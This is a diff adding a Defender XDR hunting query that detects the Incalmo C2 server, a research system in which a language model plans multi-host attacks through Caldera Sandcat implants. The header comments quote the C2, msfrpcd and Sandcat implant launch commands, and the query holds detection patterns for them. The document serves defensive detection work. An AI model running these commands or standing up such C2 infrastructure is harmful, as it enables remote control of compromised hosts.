@@ -1,0 +1,36 @@
+// Incalmo C2 server on a host you monitor
+// Agentic attack detections by ThreatDefence (Incalmo). Source: https://github.com/ThreatDefence/agentic-attack-detections
+// ATT&CK: T1071.001 (Application Layer Protocol: Web Protocols), T1588.002 (Obtain Capabilities: Tool)
+// Example hunt for Defender XDR advanced hunting. Test and baseline before alerting.
+// Incalmo (cylabcyberautonomy/Incalmo, reviewed at 8cd02e0e) is a CMU research system in which a model plans a multi-host
+// attack and a Flask C2 server on 0.0.0.0:8888 hands the commands to Caldera Sandcat implants. The server has no
+// authentication. From its source code:
+//  - uv run ./incalmo/c2server/c2server.py, and Celery started with -A incalmo.c2server.celery.celery_worker.
+//  - In the attacker container: msfrpcd -P password, and ./sandcat.go -server http://<ip>:8888 -group red when MODE=docker.
+//  - Files: /tmp/state_store.db, incalmo/c2server/payloads/dynamic_payload_<port>_<paw>.sh, output/<run>/llm_agent.log.
+// What each signal relies on in the source is in ../../source-code-signals.md.
+
+let Window = 30d;
+let C2Markers = dynamic(["incalmo/c2server/c2server.py", "incalmo.c2server.celery.celery_worker"]);
+let C2Processes = DeviceProcessEvents
+    | where Timestamp > ago(Window)
+    | where ProcessCommandLine has_any (C2Markers)
+        or (ProcessCommandLine has "msfrpcd" and ProcessCommandLine has "-P password");
+let C2Devices = C2Processes | distinct DeviceName;
+union isfuzzy=true
+    (C2Processes
+        | summarize Commands=make_set(substring(ProcessCommandLine, 0, 200), 10), Timestamp=min(Timestamp) by DeviceName
+        | project Timestamp, DeviceName, Signal="Incalmo C2 server, Celery worker or msfrpcd -P password", Detail=tostring(Commands)),
+    (DeviceNetworkEvents
+        | where Timestamp > ago(Window)
+        | where ActionType == "ListeningConnectionCreated" and LocalPort == 8888
+        | where InitiatingProcessCommandLine has "c2server.py" or DeviceName in (C2Devices)
+        | summarize Timestamp=min(Timestamp) by DeviceName, InitiatingProcessCommandLine
+        | project Timestamp, DeviceName, Signal="Listener on 8888 from the Incalmo C2", Detail=substring(InitiatingProcessCommandLine, 0, 200)),
+    (DeviceFileEvents
+        | where Timestamp > ago(Window)
+        | where FolderPath has "/c2server/payloads/dynamic_payload_" or FolderPath endswith "/tmp/state_store.db"
+            or (FolderPath has "/output/" and FileName =~ "llm_agent.log") or FileName =~ "_litellm_key_status.json"
+        | summarize Files=make_set(FolderPath, 10), Timestamp=min(Timestamp) by DeviceName
+        | project Timestamp, DeviceName, Signal="Incalmo per-command scripts, state database or run logs", Detail=tostring(Files))
+| order by Timestamp desc
